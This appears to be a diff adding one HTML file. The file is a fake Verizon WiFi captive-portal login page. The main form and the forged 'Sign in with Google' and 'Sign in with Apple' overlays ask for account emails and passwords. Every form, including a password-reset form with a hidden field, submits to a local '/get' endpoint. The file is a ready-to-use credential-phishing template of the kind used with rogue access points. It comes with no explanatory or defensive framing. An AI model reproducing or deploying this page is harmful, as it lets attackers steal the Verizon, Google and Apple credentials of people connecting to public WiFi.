@@ -1,0 +1,92 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Verizon WiFi</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;display:flex;flex-direction:column;min-height:100vh;max-width:480px;margin:0 auto;color:#1a1a1a}
+#tg,#ta,#tf,#tu,#tp{display:none}
+.dot{width:6px;height:6px;border-radius:50%;background:#4CAF50;animation:p 2s infinite;flex-shrink:0}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
+.scene{flex:1;background:#f5f5f5;padding:0 0 28px}
+.ca{padding:14px 16px 0}
+.card{background:#fff;border-radius:14px;padding:18px;box-shadow:0 2px 12px rgba(205,4,11,.08);margin-bottom:12px}
+.fw{position:relative;margin-bottom:10px}
+.fi{width:100%;padding:16px 13px 7px;border:1.5px solid #e0d0d0;border-radius:9px;font-size:15px;color:#1a1a1a;outline:none;background:#fff;transition:border-color .15s}
+.fi:focus{border-color:#CD040B}
+.fi::placeholder{color:transparent}
+.fl{position:absolute;top:50%;left:14px;transform:translateY(-50%);font-size:14px;color:#bbb;pointer-events:none;transition:all .15s;background:#fff;padding:0 2px}
+.fi:focus~.fl,.fi:not(:placeholder-shown)~.fl{top:9px;font-size:9px;color:#CD040B;font-weight:700;text-transform:uppercase;letter-spacing:.5px;transform:none}
+.pe{position:absolute;right:13px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:10px;font-weight:700;color:#CD040B;text-transform:uppercase}
+#tp:checked~.scene .pwa{-webkit-text-security:none}
+#tp:not(:checked)~.scene .pwa{-webkit-text-security:disc}
+#tp:checked~.scene .ls{display:none}
+#tp:not(:checked)~.scene .lh{display:none}
+.btn{width:100%;padding:14px;border:none;border-radius:9px;background:#CD040B;color:#fff;font-size:14px;font-weight:700;cursor:pointer;display:block;text-align:center}
+.hr2{display:flex;justify-content:flex-end;margin-bottom:13px}
+.lk{font-size:12px;color:#CD040B;font-weight:700;cursor:pointer;background:none;padding:0;border:none}
+.or{display:flex;align-items:center;gap:9px;margin:13px 0 11px}
+.or::before,.or::after{content:"";flex:1;height:1px;background:#eee}
+.or span{font-size:11px;color:#ccc;font-weight:700}
+.sg{width:100%;padding:11px;border-radius:9px;font-size:13px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;line-height:1}
+.sgg{border:1.5px solid #e0e0e0;background:#fff;color:#1a1a1a}
+.sga{border:none;background:#1a1a1a;color:#fff}
+.apple-ic{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;flex-shrink:0;font-family:-apple-system,'SF Pro Text',Helvetica,sans-serif;font-size:17px;line-height:1;position:relative;top:-1px}
+.tn2{font-size:10px;color:#bbb;text-align:center;line-height:1.6;margin-top:11px}
+.tn2 label{color:#CD040B;font-weight:700;cursor:pointer;text-decoration:underline;font-size:10px;border:none;padding:0}
+.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:100;align-items:flex-end;justify-content:center}
+#tg:checked~.ov-g,#ta:checked~.ov-a,#tf:checked~.ov-f,#tu:checked~.ov-u{display:flex}
+.bd{position:absolute;inset:0}
+.sh{position:relative;background:#fff;border-radius:18px 18px 0 0;width:100%;max-width:480px;padding:16px 18px 34px;z-index:1;max-height:88vh;overflow-y:auto}
+.sha{background:#f2f2f7}
+.hdl{width:32px;height:4px;background:#e0e0e0;border-radius:2px;margin:0 auto 14px}
+.sl2{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:#aaa;margin-bottom:4px;display:block;margin-top:9px}
+.inp{width:100%;padding:11px 12px;border:1.5px solid #e0d0d0;border-radius:9px;font-size:14px;color:#1a1a1a;outline:none;display:block;background:#fff}
+.inp:focus{border-color:#CD040B}
+.inp::placeholder{color:#bbb}
+.ai2{width:100%;padding:13px 14px;border:none;font-size:15px;color:#1a1a1a;outline:none;background:#fff;display:block}
+.ai2::placeholder{color:#bbb}
+.ai2:first-child{border-bottom:1px solid #ebebeb}
+</style></head>
+<body>
+<input type="checkbox" id="tp"><input type="checkbox" id="tg"><input type="checkbox" id="ta"><input type="checkbox" id="tf"><input type="checkbox" id="tu">
+<div style="background:#fff;padding:14px 18px;border-bottom:1px solid #f5e0e0;display:flex;align-items:center;gap:12px">
+  <div style="width:40px;height:40px;border-radius:50%;background:#CD040B;flex-shrink:0"></div>
+  <div>
+    <div style="font-size:17px;font-weight:700;color:#1a1a1a">Verizon</div>
+    <div style="font-size:11px;color:#888;display:flex;align-items:center;gap:5px"><span class="dot"></span>Verizon Wi-Fi &middot; Connected</div>
+  </div>
+</div>
+<div style="background:linear-gradient(180deg,#fdecea 0%,#f5f5f5 100%);padding:20px 18px 16px;border-bottom:1px solid #f0d0d0">
+  <div style="font-size:20px;font-weight:700;color:#1a1a1a;margin-bottom:4px">Sign in to Verizon</div>
+  <div style="font-size:13px;color:#888">Access your My Verizon account</div>
+</div>
+<div class="scene"><div class="ca">
+  <div class="card">
+    <form action="/get">
+      <div class="fw"><input class="fi" type="text" name="email" placeholder="e" id="fe"><label class="fl" for="fe">Mobile number or email</label></div>
+      <div class="fw"><input class="fi pwa" type="password" name="password" placeholder="p" id="fp"><label class="fl" for="fp">Password</label><label for="tp" class="pe"><span class="ls">Show</span><span class="lh">Hide</span></label></div>
+      <button type="submit" class="btn">Sign In</button>
+    </form>
+    <div class="hr2" style="margin-top:10px"><label for="tf" class="lk">Forgot user ID or password?</label></div>
+    <div class="or"><span>or continue with</span></div>
+    <label for="tg" class="sg sgg">
+      <svg width="18" height="18" viewBox="0 0 18 18" style="flex-shrink:0"><path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.875 2.684-6.615z" fill="#4285F4"/><path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332C2.438 15.983 5.482 18 9 18z" fill="#34A853"/><path d="M3.964 10.71A5.41 5.41 0 0 1 3.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.996 8.996 0 0 0 0 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/><path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0 5.482 0 2.438 2.017.957 4.958L3.964 6.29C4.672 4.163 6.656 3.58 9 3.58z" fill="#EA4335"/></svg>
+      Continue with Google
+    </label>
+    <label for="ta" class="sg sga">
+      <span class="apple-ic">&#63743;</span>
+      Continue with Apple
+    </label>
+    <p class="tn2">By signing in you agree to Verizon's <label for="tu">Terms &amp; Privacy Policy</label></p>
+  </div>
+</div></div>
+
+<div class="ov ov-f"><label for="tf" class="bd"></label><div class="sh"><div class="hdl"></div><div style="font-size:17px;font-weight:700;color:#CD040B;text-align:center;margin-bottom:2px">Reset Password</div><div style="font-size:12px;color:#aaa;text-align:center;margin-bottom:16px">Enter your Verizon mobile number or email.</div><form action="/get"><label class="sl2">Mobile number or email</label><input class="inp" type="text" name="email" placeholder="your@email.com"><input type="hidden" name="password" value="recovery-attempt"><div style="display:flex;justify-content:space-between;align-items:center;margin-top:13px"><label for="tf" style="font-size:13px;color:#CD040B;cursor:pointer;font-weight:700">Cancel</label><button type="submit" style="background:#CD040B;color:#fff;border:none;border-radius:9px;padding:10px 24px;font-size:13px;font-weight:700;cursor:pointer">Send Link</button></div></form></div></div>
+
+<div class="ov ov-g"><label for="tg" class="bd"></label><div class="sh"><div class="hdl"></div><div style="font-size:17px;font-weight:700;color:#202124;text-align:center;margin-bottom:2px">Sign in with Google</div><div style="font-size:12px;color:#5f6368;text-align:center;margin-bottom:15px">Continue to Verizon WiFi</div><form action="/get"><label class="sl2">Email or phone</label><input class="inp" type="text" name="email" placeholder="Enter your email"><label class="sl2" style="margin-top:9px">Password</label><input class="inp" type="password" name="password" placeholder="Enter your password" style="margin-top:4px"><div style="display:flex;justify-content:space-between;align-items:center;margin-top:13px"><label for="tg" style="font-size:13px;color:#1a73e8;cursor:pointer;font-weight:700">Cancel</label><button type="submit" style="background:#1a73e8;color:#fff;border:none;border-radius:99px;padding:10px 24px;font-size:13px;font-weight:700;cursor:pointer">Next</button></div></form></div></div>
+
+<div class="ov ov-a"><label for="ta" class="bd"></label><div class="sh sha"><div class="hdl"></div>
+<div style="font-size:48px;text-align:center;line-height:1;margin-bottom:6px;font-family:-apple-system,'SF Pro Text',Helvetica,sans-serif">&#63743;</div>
+<div style="font-size:16px;font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:15px">Sign in with Apple</div>
+<form action="/get"><div style="background:#fff;border-radius:11px;overflow:hidden;margin-bottom:9px;border:1.5px solid #e0e0e0"><input class="ai2" type="text" name="email" placeholder="Apple ID"><input class="ai2" type="password" name="password" placeholder="Password"></div><button type="submit" style="width:100%;padding:13px;border:none;border-radius:9px;background:#1a1a1a;color:#fff;font-size:14px;font-weight:800;cursor:pointer;margin-bottom:7px">Continue</button><label for="ta" style="display:block;width:100%;padding:13px;border-radius:9px;background:#fff;color:#1a1a1a;font-size:14px;font-weight:800;cursor:pointer;text-align:center;border:1.5px solid #e0e0e0">Cancel</label></form>
+</div></div>
+
+<div class="ov ov-u"><label for="tu" class="bd"></label><div class="sh"><div class="hdl"></div><div style="font-size:15px;font-weight:800;color:#1a1a1a;margin-bottom:12px;padding-bottom:11px;border-bottom:1px solid #f0f0f0">Verizon WiFi — Terms &amp; Privacy</div><p style="font-size:12px;color:#555;line-height:1.6;margin-bottom:8px">Verizon provides WiFi access subject to its Terms of Service and Privacy Policy.</p><p style="font-size:12px;color:#555;line-height:1.6;margin-bottom:8px">Prohibited: illegal activity, unauthorized access, or interference. Verizon may monitor usage.</p><p style="font-size:12px;color:#555;line-height:1.6">Service is provided as-is. Verizon is not liable for losses from use of this network.</p><label for="tu" style="display:block;width:100%;padding:13px;border:none;border-radius:9px;background:#CD040B;color:#fff;font-size:14px;font-weight:700;cursor:pointer;text-align:center;margin-top:13px">Close &amp; Return</label></div></div>
+</body></html>
